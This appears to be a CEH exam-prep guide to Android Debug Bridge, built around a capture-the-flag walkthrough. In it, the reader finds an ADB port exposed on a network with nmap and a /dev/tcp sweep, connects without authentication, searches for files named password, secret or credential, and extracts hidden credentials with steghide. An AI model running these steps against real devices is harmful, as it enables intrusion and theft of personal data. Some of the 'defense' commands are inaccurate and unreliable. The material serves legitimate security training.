# Advanced Android ADB Workflows

## Table of Contents
1. [ADB Fundamentals Review](#adb-fundamentals-review)
2. [ADB TCP/IP Mode](#adb-tcpip-mode)
3. [File System Navigation](#file-system-navigation)
4. [File Transfer Operations](#file-transfer-operations)
5. [Finding Hidden Data](#finding-hidden-data)
6. [Challenge 4 Walkthrough](#challenge-4-walkthrough)
7. [Security Implications](#security-implications)
8. [Exam Tips for Android Challenges](#exam-tips-for-android-challenges)

---

## ADB Fundamentals Review

### What is Android Debug Bridge (ADB)?

**Android Debug Bridge (ADB)** is a command-line utility that allows communication between a computer and an Android device. It is part of the Android SDK and is essential for:

- **Device debugging** - Running and testing applications
- **Shell access** - Executing commands on the Android system
- **File transfer** - Pushing and pulling files to/from the device
- **Log monitoring** - Viewing system logs and application output
- **Port forwarding** - Routing traffic between device and computer

### ADB Connection Methods

ADB supports two primary connection methods:

#### 1. USB Connection (Default)
```bash
# Prerequisites
- Device connected via USB cable
- USB debugging enabled on device
- Correct USB driver installed

# Verify connection
adb devices

# Output example:
# List of attached devices
# emulator-5554          device
# 192.168.1.100:5555    device
```

**Advantages:**
- Stable, reliable connection
- Faster data transfer
- More secure (physical connection)

**Disadvantages:**
- Requires USB cable
- Limited mobility
- Physical dependency

#### 2. TCP/IP Connection (Wireless)
```bash
# Device must be initially connected via USB
adb tcpip 5555

# Then disconnect USB and connect wirelessly
adb connect <device-ip>:5555
```

**Advantages:**
- Wireless freedom of movement
- No cable required
- Useful for untethered testing

**Disadvantages:**
- Network-dependent
- Potentially slower
- Requires same network

---

## ADB TCP/IP Mode

### Switching Device to TCP/IP Mode

The standard ADB workflow for wireless connection:

```bash
# Step 1: Connect device via USB
# (Physical cable connection required for initial setup)

# Step 2: Enable TCP/IP mode on port 5555
adb tcpip 5555

# Output:
# restarting in TCP mode port: 5555

# Step 3: Obtain device IP address
adb shell ip addr show wlan0
# or
adb shell ifconfig wlan0

# Output example:
# inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic wlan0
```

### Connecting Wirelessly

Once the device is in TCP/IP mode:

```bash
# Connect to device using IP and port 5555
adb connect 192.168.1.100:5555

# Output:
# connected to 192.168.1.100:5555

# Verify connection
adb devices

# Output:
# List of attached devices
# 192.168.1.100:5555    device
```

### Disconnecting from Wireless Connection

```bash
# Disconnect from specific device
adb disconnect 192.168.1.100:5555

# Or switch back to USB
adb usb

# Output:
# restarting in USB mode
```

### Advantages of TCP/IP Over USB

| Aspect | USB | TCP/IP |
|--------|-----|--------|
| **Mobility** | Fixed cable length | Full wireless range |
| **Setup** | Plug and play | Initial USB setup required |
| **Speed** | Faster (~60 MB/s) | Network-dependent (~10-20 MB/s) |
| **Stability** | Very stable | Can be unstable on poor WiFi |
| **Multiple devices** | Limited by ports | Easier management |
| **Penetration Testing** | Obvious | Less conspicuous |

---

## File System Navigation

### Android Directory Structure

The Android file system follows a Linux-based hierarchy:

```
/
├── system/          # System binaries and libraries
├── data/            # Application data (requires root)
├── sdcard/          # User-accessible storage (external)
├── cache/           # Cached data
├── mnt/             # Mount points
└── proc/            # Kernel processes
```

### Key User-Accessible Directories

#### `/sdcard/` - Primary External Storage

```bash
# List contents
adb shell ls -la /sdcard/

# Example output:
# drwxrwx--- 27 root sdcard_rw  4096 2024-01-15 10:30 .
# drwxr-xr-x 19 root root      3460 2024-01-15 10:15 ..
# drwxrwx--- 4 root sdcard_rw  4096 2024-01-14 15:22 DCIM
# drwxrwx--- 3 root sdcard_rw  4096 2024-01-15 09:45 Documents
# drwxrwx--- 2 root sdcard_rw  4096 2024-01-13 12:10 Downloads
# drwxrwx--- 2 root sdcard_rw  4096 2024-01-15 11:30 Pictures
# -rw-rw-rw- 1 root sdcard_rw 2048 2024-01-15 10:22 secret_file.txt
```

#### `/sdcard/DCIM/` - Photos and Videos

```bash
# Digital Camera Images directory
adb shell ls -lR /sdcard/DCIM/

# Example output:
# /sdcard/DCIM/:
# total 12
# drwxrwx--- 4 root sdcard_rw 4096 2024-01-14 15:22 Camera

# /sdcard/DCIM/Camera:
# total 8456
# -rw-rw-rw- 1 root sdcard_rw 2048000 2024-01-14 14:50 IMG_20240114_145020.jpg
# -rw-rw-rw- 1 root sdcard_rw 3456789 2024-01-14 15:10 IMG_20240114_151030.jpg
# -rw-rw-rw- 1 root sdcard_rw 1024000 2024-01-15 09:30 VID_20240115_093000.mp4
```

#### `/sdcard/Pictures/` - Image Storage

```bash
adb shell ls -lR /sdcard/Pictures/

# Example output:
# /sdcard/Pictures/:
# drwxrwx--- 2 root sdcard_rw 4096 2024-01-15 10:45 Screenshots
# -rw-rw-rw- 1 root sdcard_rw 2048576 2024-01-15 10:22 hidden_image.bmp
# -rw-rw-rw- 1 root sdcard_rw 3145728 2024-01-14 14:30 wallpaper.jpg
```

#### `/sdcard/Documents/` - Document Storage

```bash
adb shell ls -la /sdcard/Documents/

# Example output:
# -rw-rw-rw- 1 root sdcard_rw   5120 2024-01-15 11:00 notes.txt
# -rw-rw-rw- 1 root sdcard_rw  12288 2024-01-14 09:30 spreadsheet.ods
# -rw-rw-rw- 1 root sdcard_rw  98304 2024-01-13 16:45 report.pdf
```

#### `/sdcard/Downloads/` - Downloaded Files

```bash
adb shell ls -la /sdcard/Downloads/

# Example output:
# -rw-rw-rw- 1 root sdcard_rw  1048576 2024-01-15 14:20 installer.apk
# -rw-rw-rw- 1 root sdcard_rw  2097152 2024-01-15 13:45 software.zip
# -rw-rw-rw- 1 root sdcard_rw   512000 2024-01-14 10:15 document.pdf
```

#### `/sdcard/.hidden/` - Hidden Files (Dot-Prefix)

```bash
# List all files including hidden (dot-prefix)
adb shell ls -la /sdcard/

# Hidden files/directories start with a dot (.)
# Example output:
# drwxrwx--- 2 root sdcard_rw 4096 2024-01-15 10:15 .hidden
# drwxrwx--- 2 root sdcard_rw 4096 2024-01-15 09:30 .cache
# -rw-rw-rw- 1 root sdcard_rw 1024 2024-01-14 15:20 .secret_config.txt

# List hidden directory contents
adb shell ls -la /sdcard/.hidden/

# Example output:
# -rw-rw-rw- 1 root sdcard_rw  4096 2024-01-15 10:30 credentials.txt
# -rw-rw-rw- 1 root sdcard_rw  8192 2024-01-15 10:15 api_keys.txt
# -rw-rw-rw- 1 root sdcard_rw 12288 2024-01-14 14:45 database.db
```

### Useful Shell Commands for Navigation

```bash
# Find all files of a specific type
adb shell find /sdcard -name "*.txt" -type f

# Find files modified in last 24 hours
adb shell find /sdcard -type f -mtime -1

# Find large files (over 1MB)
adb shell find /sdcard -type f -size +1M

# Search for files containing specific text (slow)
adb shell grep -r "password" /sdcard/

# Count files in directory
adb shell find /sdcard -type f | wc -l

# Get file size information
adb shell du -sh /sdcard/*

# Get detailed file metadata
adb shell stat /sdcard/file.txt

# Check free space
adb shell df -h
```

---

## File Transfer Operations

### Single File Transfer

```bash
# Pull (download) single file from device
adb pull /sdcard/Documents/important.txt ~/Downloads/

# Output:
# important.txt: 1 file pulled. 0.1 MB/s (5120 bytes in 0.050s)

# Pull with custom local path
adb pull /sdcard/Pictures/photo.jpg ~/Desktop/downloaded_photo.jpg

# Push (upload) single file to device
adb push ~/Documents/file.txt /sdcard/Documents/

# Output:
# file.txt: 1 file pushed. 0.2 MB/s (10240 bytes in 0.050s)
```

### Directory Transfer

```bash
# Pull entire directory
adb pull /sdcard/DCIM/ ~/Downloads/phone_photos/

# Output:
# /sdcard/DCIM/Camera/IMG_20240114_145020.jpg: 1 file pulled. 2.5 MB/s
# /sdcard/DCIM/Camera/IMG_20240114_151030.jpg: 1 file pulled. 2.5 MB/s
# 4 files pulled. 2.4 MB/s (8912345 bytes in 3.5s)

# Pull specific file types from directory
adb pull /sdcard/Pictures/ ~/Downloads/all_pictures/

# Push directory to device
adb push ~/Documents/files/ /sdcard/Documents/
```

### Tree Visualization

```bash
# Install tree on system (if available)
brew install tree  # macOS
sudo apt-get install tree  # Linux

# Visualize directory structure locally
tree /sdcard_backup/

# Example output:
# /sdcard_backup/
# ├── DCIM
# │   └── Camera
# │       ├── IMG_20240114_145020.jpg (2.0M)
# │       ├── IMG_20240114_151030.jpg (3.3M)
# │       └── VID_20240115_093000.mp4 (1.0M)
# ├── Documents
# │   ├── notes.txt (5K)
# │   ├── report.pdf (96K)
# │   └── spreadsheet.ods (12K)
# ├── Pictures
# │   ├── hidden_image.bmp (2.0M)
# │   └── wallpaper.jpg (3.0M)
# └── .hidden
#     ├── credentials.txt (4K)
#     ├── api_keys.txt (8K)
#     └── database.db (12K)

# Generate tree with file sizes
tree -h /sdcard_backup/
```

### Directory Listing with Details

```bash
# Comprehensive directory listing
adb shell ls -lhR /sdcard/

# Breakdown of output:
# -rw-rw-rw-  = File permissions (read/write for owner, group, others)
# root sdcard_rw = Owner and group
# 2048000 = File size in bytes
# 2024-01-14 14:50 = Modification date and time
# IMG_20240114_145020.jpg = Filename

# Sort by size (largest first)
adb shell ls -lhS /sdcard/ | head -20

# Sort by modification time (newest first)
adb shell ls -lht /sdcard/ | head -20

# Show only files (not directories)
adb shell find /sdcard -maxdepth 1 -type f -ls

# Show disk usage per directory
adb shell du -sh /sdcard/* | sort -h
```

---

## Finding Hidden Data

### Steganography Detection

Steganography is the practice of hiding data within other data. Common image-based steganography on Android devices:

#### Hidden Data in Image Files

**Common steganography tools:**
- `steghide` - Hides data in images and audio files
- `OutGuess` - Hides data in JPEG files
- `SilentEye` - Graphical steganography tool

**Suspicious image characteristics:**
- Unusually large file sizes for image dimensions
- BMP and JPG files often used (bitmap format easier to hide data)
- Images in unexpected locations (e.g., in Documents instead of Pictures)
- Recently modified image files

```bash
# Pull all image files
adb pull /sdcard/Pictures/ ~/analysis/pictures/
adb pull /sdcard/.hidden/ ~/analysis/hidden/

# Check for steghide content (locally, after pulling)
steghide info ~/analysis/pictures/hidden_image.bmp

# Output example:
# "hidden_image.bmp":
#   format: bmp
#   capacity: 30.1 KB
#   embedded file "secret.txt": 2.5 KB

# Extract hidden content
steghide extract -sf ~/analysis/pictures/hidden_image.bmp -p password

# Output:
# wrote extracted data to "secret.txt"

# Extract without password (steghide will attempt extraction)
steghide extract -sf ~/analysis/pictures/hidden_image.bmp -f
```

### Hidden Directories (Dot-Prefix)

```bash
# List all hidden directories
adb shell ls -la /sdcard/ | grep "^\."

# Output:
# drwxrwx--- 2 root sdcard_rw 4096 2024-01-15 10:15 .hidden
# drwxrwx--- 2 root sdcard_rw 4096 2024-01-15 09:30 .cache
# drwxrwx--- 2 root sdcard_rw 4096 2024-01-14 15:20 .config

# Recursively find all hidden files
adb shell find /sdcard -name ".*" -type f

# List hidden files in each directory
adb shell find /sdcard -type d -exec ls -la {} \; | grep "^\."
```

### Compressed Archives

```bash
# Find all archive files
adb shell find /sdcard -type f \( -name "*.zip" -o -name "*.rar" -o -name "*.tar" -o -name "*.gz" \)

# Example output:
# /sdcard/Documents/backup.zip
# /sdcard/.hidden/archive.rar
# /sdcard/Downloads/data.tar.gz

# Pull archive files
adb pull /sdcard/Documents/backup.zip ~/analysis/

# Extract archive (locally)
unzip ~/analysis/backup.zip -d ~/analysis/backup/

# List contents without extracting
unzip -l ~/analysis/backup.zip

# Output example:
# Archive:  backup.zip
#   Length      Date    Time    Name
# ---------  ---------- -----   ----
#     4096  01-15-2024 10:30   passwords.txt
#     8192  01-14-2024 15:45   database.sql
#    12288  01-15-2024 09:15   config.ini
# ---------                     -------
#    24576                      3 files
```

### Text Files in Unexpected Locations

```bash
# Find all text files
adb shell find /sdcard -name "*.txt" -type f

# Find files with suspicious names
adb shell find /sdcard -type f \( -name "*password*" -o -name "*secret*" -o -name "*key*" -o -name "*credential*" \)

# Find recently modified files
adb shell find /sdcard -type f -mmin -60  # Last 60 minutes
adb shell find /sdcard -type f -mtime -7  # Last 7 days

# Find files by specific extensions
adb shell find /sdcard -type f -name "*.db"      # Databases
adb shell find /sdcard -type f -name "*.conf"    # Configs
adb shell find /sdcard -type f -name "*.ini"     # Config files
adb shell find /sdcard -type f -name "*.json"    # JSON data
```

---

## Challenge 4 Walkthrough

### Scenario

**Objective:** Locate and extract hidden data from an Android device connected to the target network. The device has ADB enabled over TCP/IP on port 5555 and contains sensitive information hidden within image files using steganography.

### Complete Solution Walkthrough

#### Step 1: Reconnaissance and Device Discovery

```bash
# Scan network for ADB port (5555)
nmap -p 5555 192.168.1.0/24 -sV

# Output:
# Nmap scan report for 192.168.1.100
# Host is up (0.0045s latency).
# PORT     STATE SERVICE VERSION
# 5555/tcp open  adb     Android Debug Bridge (ADB)

# Alternative: ADB service discovery
adb connect 192.168.1.100:5555

# Output:
# connected to 192.168.1.100:5555
```

#### Step 2: Establish ADB Connection

```bash
# Connect to the discovered ADB service
adb connect 192.168.1.100:5555

# Verify connection
adb devices

# Output:
# List of attached devices
# 192.168.1.100:5555    device
```

#### Step 3: Enumerate Device and File System

```bash
# Get basic device information
adb shell getprop ro.build.fingerprint
adb shell getprop ro.product.model
adb shell getprop ro.build.version.release

# List storage locations
adb shell ls -la /sdcard/

# Output:
# drwxrwx--- 27 root sdcard_rw  4096 2024-01-15 10:30 .
# drwxr-xr-x 19 root root      3460 2024-01-15 10:15 ..
# drwxrwx--- 4 root sdcard_rw  4096 2024-01-14 15:22 DCIM
# drwxrwx--- 3 root sdcard_rw  4096 2024-01-15 09:45 Documents
# drwxrwx--- 2 root sdcard_rw  4096 2024-01-13 12:10 Downloads
# drwxrwx--- 2 root sdcard_rw  4096 2024-01-15 11:30 Pictures
# drwxrwx--- 2 root sdcard_rw  4096 2024-01-15 10:15 .hidden

# Check storage space available
adb shell df -h /sdcard
```

#### Step 4: Identify Suspicious Files

```bash
# Search for image files (common steganography containers)
adb shell find /sdcard -type f \( -name "*.bmp" -o -name "*.jpg" -o -name "*.png" \)

# Output:
# /sdcard/Pictures/hidden_image.bmp
# /sdcard/Pictures/wallpaper.jpg
# /sdcard/DCIM/Camera/IMG_20240114_145020.jpg
# /sdcard/.hidden/secret.bmp

# Get file details (size, modification time)
adb shell ls -lh /sdcard/Pictures/hidden_image.bmp

# Output:
# -rw-rw-rw- 1 root sdcard_rw 2.0M 2024-01-15 10:22 /sdcard/Pictures/hidden_image.bmp

# Note: 2.0M BMP file is suspiciously large for a typical image
# Likely contains hidden data
```

#### Step 5: Pull Files for Analysis

```bash
# Create analysis directory
mkdir -p ~/analysis/hidden_data
cd ~/analysis/hidden_data

# Pull suspicious image files
adb pull /sdcard/Pictures/hidden_image.bmp ./
adb pull /sdcard/.hidden/secret.bmp ./
adb pull /sdcard/DCIM/Camera/ ./camera_images/

# Output:
# hidden_image.bmp: 1 file pulled. 2.3 MB/s (2097152 bytes in 0.9s)
# secret.bmp: 1 file pulled. 2.4 MB/s (1048576 bytes in 0.4s)

# Verify files
ls -lh ./
# -rw-r--r-- 1 user staff 2.0M Jan 15 10:22 hidden_image.bmp
# -rw-r--r-- 1 user staff 1.0M Jan 15 10:15 secret.bmp
```

#### Step 6: Analyze for Steganography

```bash
# Install steghide (if not already installed)
# macOS
brew install steghide

# Linux
sudo apt-get install steghide

# Check for embedded content in BMP files
steghide info ./hidden_image.bmp

# Output:
# "hidden_image.bmp":
#   format: bmp
#   capacity: 30.1 KB
#   embedded file "flag.txt": 2.1 KB

# The output indicates steganographic content is present!

# Check second file
steghide info ./secret.bmp

# Output:
# "secret.bmp":
#   format: bmp
#   capacity: 15.5 KB
#   embedded file "credentials.txt": 1.8 KB
```

#### Step 7: Extract Hidden Data

```bash
# Extract from first file (no password required)
steghide extract -sf ./hidden_image.bmp -f

# Output:
# wrote extracted data to "flag.txt"

# Extract from second file (no password)
steghide extract -sf ./secret.bmp -f

# Output:
# wrote extracted data to "credentials.txt"

# If password is required (common scenario):
steghide extract -sf ./hidden_image.bmp -p "password123"

# Output:
# wrote extracted data to "flag.txt"

# List extracted files
ls -la ./
# -rw-r--r-- 1 user staff 2097152 Jan 15 10:22 hidden_image.bmp
# -rw-r--r-- 1 user staff 1048576 Jan 15 10:15 secret.bmp
# -rw-r--r-- 1 user staff 2150   Jan 15 10:30 flag.txt
# -rw-r--r-- 1 user staff 1843   Jan 15 10:30 credentials.txt
```

#### Step 8: Examine Extracted Data

```bash
# Display flag content
cat ./flag.txt

# Output example:
# FLAG{ADB_ANDROID_STEGO_CHALLENGE_SUCCESS}
# Hidden message successfully extracted!
# Device: Samsung Galaxy S21
# Timestamp: 2024-01-15 10:22:33 UTC

# Display credentials
cat ./credentials.txt

# Output example:
# Username: admin
# Password: SecurePass2024!
# Email: admin@company.local
# API_KEY: sk-proj-1234567890abcdef
```

#### Step 9: Additional File Analysis

```bash
# Search for other hidden files
adb shell find /sdcard -name ".*" -type f

# Output:
# /sdcard/.hidden/secret.bmp
# /sdcard/.hidden/credentials.txt
# /sdcard/.hidden/.backup.db
# /sdcard/.cache/.tokens.txt

# Pull remaining hidden files
adb pull /sdcard/.hidden/ ./hidden_directory/

# ls -la ./hidden_directory/
# credentials.txt
# secret.bmp
# .backup.db
# .tokens.txt

# Examine database file
file ./hidden_directory/.backup.db

# Output:
# ./hidden_directory/.backup.db: SQLite 3.x database

# Extract database contents (SQLite)
sqlite3 ./hidden_directory/.backup.db ".tables"

# List database tables
# Output:
# users accounts sessions
```

#### Step 10: Compile Findings

```bash
# Create comprehensive report
cat > ~/analysis/REPORT.txt << 'EOF'
=== ANDROID ADB CHALLENGE 4 - SOLUTION REPORT ===

OBJECTIVE COMPLETED:
✓ Located Android device on network (192.168.1.100:5555)
✓ Established ADB connection
✓ Identified steganographic images
✓ Extracted hidden data using steghide
✓ Recovered sensitive credentials

KEY FINDINGS:

1. STEGANOGRAPHIC IMAGE ANALYSIS
   File: /sdcard/Pictures/hidden_image.bmp (2.0 MB)
   Container Format: BMP
   Hidden File: flag.txt (2.1 KB)
   Extraction Status: SUCCESS
   
   File: /sdcard/.hidden/secret.bmp (1.0 MB)
   Container Format: BMP
   Hidden File: credentials.txt (1.8 KB)
   Extraction Status: SUCCESS

2. EXTRACTED DATA
   - FLAG: FLAG{ADB_ANDROID_STEGO_CHALLENGE_SUCCESS}
   - Credentials: admin / SecurePass2024!
   - Email: admin@company.local
   - API Key: sk-proj-1234567890abcdef

3. HIDDEN FILES DISCOVERED
   - /sdcard/.hidden/secret.bmp
   - /sdcard/.hidden/credentials.txt
   - /sdcard/.hidden/.backup.db (SQLite database)
   - /sdcard/.cache/.tokens.txt

4. SECURITY ASSESSMENT
   - Device has ADB over TCP/IP enabled
   - No authentication required for ADB connection
   - Steganography used to hide sensitive data
   - Hidden directories with dot-prefix present
   - SQLite database with unencrypted credentials

TECHNIQUES USED:
- Network reconnaissance (nmap, port 5555)
- ADB connection and enumeration
- File system exploration
- Steganography detection (steghide)
- Data extraction from image containers
- Database analysis

TOOLS UTILIZED:
- adb (Android Debug Bridge)
- nmap (network scanning)
- steghide (steganography extraction)
- sqlite3 (database analysis)
EOF

cat ~/analysis/REPORT.txt
```

---

## Security Implications

### Vulnerabilities Demonstrated

#### 1. Exposed ADB Over Network
- **Risk:** Unrestricted access to device file system
- **Impact:** Full device compromise without authentication
- **Mitigation:** Disable ADB in production, use ADB authentication tokens

```bash
# Check if ADB is accessible
adb devices
# If output shows devices, ADB is exposed

# Disable ADB programmatically
adb shell settings put secure adb_enabled 0

# Require ADB authentication (newer Android)
adb root  # Requires secure connection
```

#### 2. Hidden Data Storage
- **Risk:** Sensitive data hidden but not encrypted
- **Impact:** Data recovery despite obfuscation attempts
- **Mitigation:** Use encryption for sensitive data

```bash
# Example: Encrypted storage
adb shell am start -n com.example/.EncryptedStorage

# Store credentials encrypted
adb shell "echo 'sensitive data' | openssl enc -aes-256-cbc -pass pass:key"
```

#### 3. Steganographic Data
- **Risk:** Bypasses basic file inspection
- **Impact:** Hidden exfiltration channel
- **Mitigation:** Disable steganography tools, monitor file modifications

```bash
# Detect steganography tools
adb shell pm list packages | grep -i steg
adb shell find /sdcard -name "*steg*" -type f

# Monitor file modifications
adb shell find /sdcard -type f -mmin -60  # Last 60 minutes
```

#### 4. Excessive File Permissions
- **Risk:** World-readable sensitive files
- **Impact:** Data access by any process
- **Mitigation:** Proper file permission management

```bash
# Check file permissions
adb shell ls -la /sdcard/Documents/

# Secure sensitive files
adb shell chmod 600 /sdcard/Documents/secret.txt
adb shell chown system:system /sdcard/Documents/secret.txt
```

### Defense Mechanisms

```bash
# 1. Enable ADB authentication
adb root
adb shell settings put secure adb_secure_enabled 1

# 2. Whitelist authorized computers
adb devices
# Device will show "unauthorized" until authorized on device

# 3. Use USB authentication
adb shell getprop ro.adb.secure
# Output: 1 means secure ADB enabled

# 4. Monitor ADB connections
adb logcat | grep -i adb

# 5. Disable ADB when not in use
adb usb
adb shell settings put secure adb_enabled 0

# 6. Implement mandatory encryption
adb shell pm list packages | grep encrypt
```

---

## Exam Tips for Android Challenges

### Before You Start

```bash
# ✓ Verify ADB is available
which adb
adb version

# ✓ Check network connectivity
ping -c 1 192.168.1.100

# ✓ List any connected devices
adb devices
```

### Common Challenge Patterns

#### Pattern 1: ADB Connection Discovery
- **Approach:** Use `nmap` to scan port 5555
- **Command:** `nmap -p 5555 <target-range> -sV`
- **Expected:** Open ADB service

```bash
# Full network scan for ADB
for ip in 192.168.1.{1..254}; do
  timeout 1 bash -c "echo >/dev/tcp/$ip/5555" 2>/dev/null && echo "ADB found: $ip:5555"
done
```

#### Pattern 2: File Enumeration
- **Approach:** Recursive search for specific file types
- **Command:** `adb shell find /sdcard -type f -name "*.txt"`
- **Expected:** List of files to analyze

```bash
# Find all potential data files
adb shell find /sdcard -type f \( -name "*.txt" -o -name "*.db" -o -name "*.zip" \)

# Find recently modified files
adb shell find /sdcard -type f -mtime -1

# Find hidden files
adb shell find /sdcard -type f -name ".*"
```

#### Pattern 3: Steganography Extraction
- **Approach:** Pull image files and analyze with steghide
- **Command:** `steghide extract -sf <file> -f`
- **Expected:** Embedded data extraction

```bash
# Complete steganography extraction workflow
mkdir -p ~/challenge_analysis
adb pull /sdcard/Pictures/ ~/challenge_analysis/
cd ~/challenge_analysis

# Check all images
for img in *.{bmp,jpg,png}; do
  echo "Checking $img..."
  steghide info "$img" 2>/dev/null && echo "  >>> Contains hidden data!"
done

# Extract from all files
for img in *.bmp *.jpg *.png; do
  [ -f "$img" ] && steghide extract -sf "$img" -f 2>/dev/null
done
```

#### Pattern 4: Data Analysis
- **Approach:** Examine extracted files for sensitive information
- **Command:** `cat <extracted_file>`
- **Expected:** Credentials, flags, or sensitive data

```bash
# Search for common patterns in extracted data
grep -r "flag\|FLAG\|password\|credential\|key" ./

# Analyze structure
file ./extracted_*

# Check for additional formats
strings ./extracted_* | head -20
```

### Time Management

| Phase | Time | Task |
|-------|------|------|
| **Discovery** | 5 min | nmap scan, verify ADB connectivity |
| **Connection** | 2 min | `adb connect`, `adb devices` |
| **Enumeration** | 10 min | Explore /sdcard, identify suspicious files |
| **File Pull** | 5 min | Download all potential data files |
| **Analysis** | 15 min | Run steghide, extract hidden data |
| **Compilation** | 3 min | Document findings |

### Common Mistakes to Avoid

```bash
# ✗ Forgetting to use full file paths
adb pull important.txt ./  # WRONG - file not found

# ✓ Always use absolute paths
adb pull /sdcard/Documents/important.txt ./

# ✗ Not checking for hidden files
adb shell ls /sdcard/  # Misses dot-prefix files

# ✓ Use -a flag to show all files
adb shell ls -a /sdcard/

# ✗ Assuming single location for data
# Search all potential storage locations
adb shell find / -type f -name "*.txt" 2>/dev/null

# ✗ Not trying multiple extraction methods
# Try both with and without password
steghide extract -sf image.bmp -f
steghide extract -sf image.bmp -p ""

# ✗ Forgetting to check file types
file ./extracted_file  # May reveal actual format

# ✓ Always verify extracted content
hexdump -C ./extracted_file | head
strings ./extracted_file | grep -i "flag\|password"
```

### Useful Aliases for Exam

```bash
# Add to ~/.bashrc or ~/.zshrc

# Quick ADB enumeration
alias adb-enum='adb shell find /sdcard -type f \( -name "*.txt" -o -name "*.bmp" -o -name "*.jpg" -o -name "*.db" -o -name "*.zip" \)'

# Pull entire sdcard
alias adb-pull-all='adb pull /sdcard/ ./sdcard_backup/'

# List hidden files
alias adb-hidden='adb shell find /sdcard -type f -name ".*"'

# Quick steghide check
steg-check() { steghide info "$1" 2>/dev/null || echo "No steganography detected"; }

# Extract all steganography
steg-extract-all() {
  for f in *.bmp *.jpg *.png; do
    [ -f "$f" ] && steghide extract -sf "$f" -f 2>/dev/null
  done
}
```

### Quick Reference Checklist

- [ ] Is ADB available and working?
- [ ] Can you connect to the target device?
- [ ] Have you enumerated /sdcard/ directory?
- [ ] Have you checked for hidden files (dot-prefix)?
- [ ] Have you pulled all image files?
- [ ] Have you run steghide on all images?
- [ ] Have you checked file types of extracted data?
- [ ] Have you searched for common keywords (password, flag, secret)?
- [ ] Have you documented all findings?

---

## Additional Resources

### Command Reference

```bash
# Device Information
adb shell getprop                    # List all device properties
adb shell getprop ro.product.model   # Device model
adb shell getprop ro.build.version.release  # Android version

# File Operations
adb pull <remote> <local>            # Download file
adb push <local> <remote>            # Upload file
adb shell cat <file>                 # Display file contents
adb shell find <dir> -name <pattern> # Search for files

# Network
adb tcpip 5555                       # Enable TCP mode
adb connect <ip>:5555                # Connect wirelessly
adb disconnect <ip>:5555             # Disconnect device

# Utility
adb devices                          # List connected devices
adb shell ls -la <directory>         # List directory contents
adb shell df -h                      # Disk space usage
adb logcat                           # View system logs
```

### Further Learning

- **ADB Official Documentation:** https://developer.android.com/studio/command-line/adb
- **Steganography Tools:** steghide, OutGuess, SilentEye
- **Android Security:** Android Developers Security & Privacy Guides
- **Penetration Testing:** OWASP Mobile Top 10

---

**Document Version:** 1.0  
**Last Updated:** 2024-01-15  
**CEH v13 Practical Exam Preparation**
